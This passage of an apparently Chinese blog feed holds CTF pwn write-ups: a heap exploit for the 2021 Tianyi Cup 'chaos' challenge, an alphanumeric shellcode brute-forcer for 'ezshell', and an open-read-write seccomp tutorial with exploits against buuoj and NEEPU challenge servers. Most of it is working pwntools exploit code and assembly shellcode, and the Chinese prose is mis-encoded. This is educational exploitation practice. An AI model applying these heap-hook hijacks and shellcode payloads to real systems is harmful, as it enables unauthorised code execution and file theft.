class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021å¤©ç¿¼æ¯PWN</title>
    <url>/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ªèœäº†ï¼Œä¸€é¢˜æ²¡å‡ºï¼›åˆæ˜¯æŠ±ç€å¤§ä½¬WPè·Ÿç€å¤ç°~</p>
<p>æ¥æºï¼š<a href="http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/">http://www.darry-long.top/2021/09/23/2021-%E5%A4%A9%E7%BF%BC%E6%9D%AF-pwn/</a></p>
<h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926091254408.png" alt="image-20210926091254408"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926100956854.png" alt="image-20210926100956854"></p>
<p>ç¬¬ä¸€æ¬¡è¿›è¡Œæ¯”è¾ƒé•¿çš„ä»£ç å®¡è®¡ï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯è·Ÿç€å¤§ä½¬çš„æ³¨é‡Šè¾¹å†™è¾¹è€ƒè™‘é€»è¾‘</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101234190.png" alt="image-20210926101234190"></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926101445271.png" alt="image-20210926101445271"></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926110301065-16326298376511.png" alt="image-20210926110301065"></p>
<p>è¿™ä¿å­˜çš„æ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œåœ¨æ¯ä¸ªç”³è¯·å‡ºæ¥çš„å †å—ä¸Šçš„0x210ä¿å­˜åœ¨å‰ä¸€ä¸ªå †å—çš„åœ°å€ï¼Œåœ¨0x208å¤„ä¿å­˜ç€å½“å‰å †å—å¯å†™å…¥çš„æ•°æ®çš„é•¿åº¦ï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨å †æº¢å‡ºçš„ï¼Œä¿®æ”¹äº†sizeå°±å¯ä»¥ä¿®æ”¹ä¿å­˜å †å—çš„åœ°å€ï¼Œå˜æˆä»»æ„åœ°å€å†™æˆ–è€…ä¿®æ”¹ä¸‹ä¸€å—å †å—çš„å †å¤´ã€fd\bkæŒ‡é’ˆç­‰ã€‚å› ä¸ºæ˜¯å•å‘é“¾è¡¨ç»“æ„ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªä¸€ä¸ªè¿½æº¯çš„ï¼Œè¶Šæ™šç”³è¯·çš„å †å—åºå·è¶Šé å‰ï¼Œä½†æ˜¯åœ¨å †ä¸Šçš„åœ°å€å…¶å®æ˜¯é åçš„</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121301503.png" alt="image-20210926121301503"></p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20210926121807097.png" alt="image-20210926121807097"></p>
<p>æœ€ç»ˆåœ¨æˆ‘æœ¬åœ°è°ƒä¸ºç¬¦åˆone_gadgetçš„ç¯å¢ƒè¦æ±‚ï¼Œå¯æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€ç»ˆå´æ²¡æœ‰getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:3\npasswd:Ed1t1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:2\npasswd:SH0w1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.send(<span class="hljs-string">&quot;opcode:4\npasswd:D3l4te1\n\r\r\n&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x4c0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#æ–°ç”³è¯·çš„ä¸º0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(heap_addr + <span class="hljs-number">0x2e0</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4f432</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(mlh - <span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">1</span>, p64(ogg) + p64(realloc + <span class="hljs-number">9</span>))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091318701.png" alt="image-20211003091318701"></p>
<p>ç¨‹åºå¾ˆç®€å•ï¼Œæ€»çš„è¯´å°±æ˜¯è¾“å…¥å†…å®¹ï¼Œç„¶åè½¬ç§»åˆ°å¯æ‰§è¡Œçš„åœ°å€ä¸Šå»æ‰§è¡Œã€‚</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091835842.png" alt="image-20211003091835842"></p>
<p>ç„¶åå¼€å¯äº†æ²™ç®±ï¼Œåªå…è®¸ä½¿ç”¨ open å’Œ read å‡½æ•°ï¼ŒåŒæ—¶è¦æ±‚ read å‡½æ•°çš„ fd å‚æ•°å³ç§»32ä½åä»ç„¶å¤§äº0æˆ–è€…æ˜¯å¤§ç­‰.äº4</p>
<p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091716855.png" alt="image-20211003091716855"></p>
<p>å¯å†™å¯æ‰§è¡Œæ®µåœ¨0x10000~0x11000</p>
<p>é¦–å…ˆorwæ˜¯æ²¡è·‘äº†ï¼Œä½†æ˜¯æ²¡æœ‰writeï¼Œæ‰€ä»¥åªèƒ½æ˜¯é€å­—èŠ‚è¿›è¡Œçˆ†ç ´çš„æ€æƒ³ï¼šæ ¹æ®æ˜¯å¦å¼‚å¸¸åŒºåˆ†çˆ†ç ´çš„å­—ç¬¦å¯¹é”™ã€‚ä½†æ˜¯æˆ‘æ„£æ˜¯æ²¡åšå‡ºæ¥ï¼Œç®—äº†ï¼Œæ€æƒ³çŸ¥é“å°±è¡Œï¼Œå®˜æ–¹wpæˆ‘è·‘äº†æœ¬åœ°ä¹Ÿæ²¡å‡ºï¼Œå·®è¯„ï¼</p>
<p>è´´ä¸ªå®˜æ–¹çš„wpå¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64  <br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:  <br>    context.log_level = <span class="hljs-string">&quot;debug&quot;</span>  <br>code = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)  <br>context.arch=code.arch  <br>  <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">idx, ch</span>):</span>  <br>    tmp = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    open_sec: </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp x </span><br><span class="hljs-string">        y:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp p </span><br><span class="hljs-string">        q:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            push rax </span><br><span class="hljs-string">            pop rdi </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            xor rdx, rdx </span><br><span class="hljs-string">            add dl, 0xff </span><br><span class="hljs-string">            mov rsi, rsp </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            mov al, [rsp+&#123;&#125;] </span><br><span class="hljs-string">            cmp al, &#123;&#125; </span><br><span class="hljs-string">            jne tmp </span><br><span class="hljs-string">            jmp $ </span><br><span class="hljs-string">        tmp: </span><br><span class="hljs-string">            xor rax,rax  </span><br><span class="hljs-string">            add al,60 </span><br><span class="hljs-string">            xor rdi,rdi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">        x: </span><br><span class="hljs-string">            call y </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">        p: </span><br><span class="hljs-string">            call q </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(idx, <span class="hljs-built_in">ord</span>(ch))  <br>  <br>    shellcode = asm(tmp)  <br>    <span class="hljs-comment"># get alphanumeric shellcode  </span><br>      <br>    <span class="hljs-keyword">return</span> AE64().encode(shellcode, <span class="hljs-string">&#x27;rdx&#x27;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)  <br>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>i = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:  <br>        conn = process(<span class="hljs-string">&quot;./chall&quot;</span>)    <br>        conn.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>, payload(i, x))  <br>        <span class="hljs-keyword">try</span>:  <br>            conn.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">1</span>)  <br>        <span class="hljs-keyword">except</span> EOFError:  <br>            conn.close()  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-built_in">print</span>(flag,i)  <br>        flag += x  <br>        i += <span class="hljs-number">1</span>  <br>        conn.close()  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:  <br>            <span class="hljs-built_in">print</span>(flag)  <br>            exit()  <br>        <span class="hljs-keyword">break</span>  <br>  <br>conn.interactive()  <br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>orw</title>
    <url>/2021/09/21/2021-09-21-orw/</url>
    <content><![CDATA[<h2 id="èƒŒæ™¯å‰ç½®"><a href="#èƒŒæ™¯å‰ç½®" class="headerlink" title="èƒŒæ™¯å‰ç½®"></a>èƒŒæ™¯å‰ç½®</h2><p>seccomp æ˜¯ secure computing çš„ç¼©å†™ï¼Œå…¶æ˜¯ Linux kernel ä»2.6.23ç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§ç®€æ´çš„ sandboxing æœºåˆ¶ã€‚åœ¨ Linux ç³»ç»Ÿé‡Œï¼Œå¤§é‡çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ç›´æ¥æš´éœ²ç»™ç”¨æˆ·æ€ç¨‹åºã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½è¢«éœ€è¦ï¼Œè€Œä¸”ä¸å®‰å…¨çš„ä»£ç æ»¥ç”¨ç³»ç»Ÿè°ƒç”¨ä¼šå¯¹ç³»ç»Ÿé€ æˆå®‰å…¨å¨èƒã€‚seccompå®‰å…¨æœºåˆ¶èƒ½ä½¿ä¸€ä¸ªè¿›ç¨‹è¿›å…¥åˆ°ä¸€ç§â€œå®‰å…¨â€è¿è¡Œæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹çš„è¿›ç¨‹åªèƒ½è°ƒç”¨4ç§ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå³ read(), write(), exit() å’Œ sigreturn()ï¼Œå¦åˆ™è¿›ç¨‹ä¾¿ä¼šè¢«ç»ˆæ­¢ã€‚</p>
<p><code>orw_seccompå‡½æ•°</code>æ‰§è¡Œäº†ä¸¤æ¬¡<code>prctl</code>å‡½æ•°ï¼ˆå‡ºç°prctlå°±æ˜¯æ²™ç®±çš„é¢˜ç›®ï¼‰</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">ç¬¬ä¸€æ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”ç¦æ­¢ææƒ<br>ç¬¬äºŒæ¬¡è°ƒç”¨prctlå‡½æ•° â€”â€”â€”â€”é™åˆ¶èƒ½æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨åªæœ‰openï¼Œ<span class="hljs-built_in">write</span>ï¼Œ<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>æ„æ€å°±æ˜¯æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šçš„ç³»ç»Ÿè°ƒç”¨getshellï¼Œä½†æ˜¯å¯ä»¥ç”¨openã€readã€writeä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å»è¯»flag</p>
<h2 id="å…¥é—¨çº§orw"><a href="#å…¥é—¨çº§orw" class="headerlink" title="å…¥é—¨çº§orw"></a>å…¥é—¨çº§orw</h2><h3 id="ä¸€ã€pwnable-orw"><a href="#ä¸€ã€pwnable-orw" class="headerlink" title="ä¸€ã€pwnable_orw"></a>ä¸€ã€pwnable_orw</h3><p>æ¥è‡ªbuuä¸Šçš„</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p>
<p>é¦–å…ˆchecksecå®Œï¼Œå‘ç°åªå¼€äº†canaryï¼Œæ”¾å…¥idaçœ‹çœ‹ã€‚å‘ç°ï¼Œå¯ä»¥è¾“å…¥æ•°æ®ï¼Œç„¶åè¿˜èƒ½å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ‰§è¡Œè°ƒç”¨ã€‚å› ä¸ºè¿™å¼€å¯æ²™ç®±ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œåªèƒ½é€šè¿‡openæ‰“å¼€flagï¼Œç„¶åreadè¯»åˆ°ç¼“å†²åŒºä¸Šï¼Œå†é€šè¿‡writeæ³„éœ²å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°flag</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p>
<p>ç¬¬ä¸€ä¸ªexpæ˜¯è‡ªå·±å»æ„é€ æ‰§è¡ŒæŒ‡ä»¤ï¼Œç¬¬äºŒä¸ªæ˜¯ç”¨pwntoolé‡Œé¢è‡ªå¸¦çš„shellcraftçš„åŠŸèƒ½ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œç¬¬äºŒä¸ªä¼šæ›´æ–¹ä¾¿è®¸å¤š</p>
<p>expçš„è¯¦ç»†è§£æï¼šï¼ˆæ¥è‡ª<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099ï¼‰</a></p>
<p>æ‰“å¼€flagæ–‡ä»¶ï¼Œsys_open(file,0,0)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">push 0x0  			#å­—ç¬¦ä¸²ç»“å°¾<br>push 0x67616c66		#&#x27;flag&#x27;<br>mov ebx,esp			<br>xor ecx,ecx			#0<br>xor edx,edx			#0<br>mov eax,0x5			#è°ƒç”¨å·<br>int 0x80			#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure>

<p> è¯»flagæ–‡ä»¶ï¼Œsys_read(3,file,0x100)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;	# ecx = char __user *buf ç¼“å†²åŒºï¼Œè¯»å‡ºçš„æ•°æ®--&gt;ä¹Ÿå°±æ˜¯è¯»â€œflagâ€<br>mov ebx,0x3;	# æ–‡ä»¶æè¿°ç¬¦ fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦ 0 1 2 3 ä»£è¡¨æ ‡å‡†çš„è¾“å‡ºè¾“å…¥å’Œå‡ºé”™,å…¶ä»–æ‰“å¼€çš„æ–‡ä»¶<br>mov edx,0x100;	#å¯¹åº”å­—èŠ‚æ•°<br>int 0x80;<br></code></pre></td></tr></table></figure>


<p>è¾“å‡ºflagæ–‡ä»¶å†…å®¹ï¼Œsys_write(1,file,0x30)ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov eax,0x4;	# eax = sys_write<br>mov ebx,0x1;	# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure>

<p>exp1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>exp2ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="äºŒã€easy-shellcode"><a href="#äºŒã€easy-shellcode" class="headerlink" title="äºŒã€easy_shellcode"></a>äºŒã€easy_shellcode</h3><p>æ¥è‡ª2021NEEPU çº³æ–°CTFä¸Šçš„ä¸€é“é¢˜</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p>
<p>64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p>
<p>è·Ÿä¸Šé¢å¾ˆç±»ä¼¼ï¼Œä¹Ÿæ˜¯æœ‰ä¸ªç›´æ¥è¾“å…¥ç‚¹ï¼Œç„¶åè°ƒç”¨æ‰§è¡Œè¾“å…¥çš„æ•°æ®ï¼Œå€Ÿç”¨shellcraftï¼ŒæŠŠå¯„å­˜å™¨æ”¹ä¸º64ä½ä¸‹çš„å³å¯è·å–flag</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="å †ä¸Šorw"><a href="#å †ä¸Šorw" class="headerlink" title="å †ä¸Šorw"></a>å †ä¸Šorw</h2><p>å‰é¢å‘¢ï¼Œéƒ½æ˜¯ä¸€äº›æœ‰å…³äºorwæ€æƒ³çš„å…¥é—¨åŸºç¡€é¢˜ï¼Œè€Œæ¯”èµ›ä¸­å¸¸è§çš„éƒ½æ˜¯å †ä¸Šçš„orw</p>
